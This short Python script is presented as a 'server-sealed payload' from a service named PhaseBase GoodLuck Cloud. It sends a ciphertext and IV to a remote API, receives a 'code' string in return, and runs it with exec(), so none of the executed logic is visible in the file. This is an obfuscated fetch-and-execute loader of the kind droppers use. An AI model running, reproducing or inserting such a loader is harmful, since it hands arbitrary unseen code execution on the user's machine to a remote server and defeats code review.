# PhaseBase :: GoodLuck Cloud (server-sealed payload) — decoder lives behind the PhaseBase API.
import json, urllib.request
_CT="Brn34EQ8cVkwrztDtQmvH6clOcFWANdojgPb"
_IV="J80GDvsCZw8s2LxD"
_API="https://phasebase.lovable.app/api/public/goodluck/decode"
_req=urllib.request.Request(_API, data=json.dumps({"ct":_CT,"iv":_IV}).encode(), headers={"Content-Type":"application/json"})
_src=json.loads(urllib.request.urlopen(_req).read())["code"]
exec(compile(_src, "<phasebase>", "exec"))
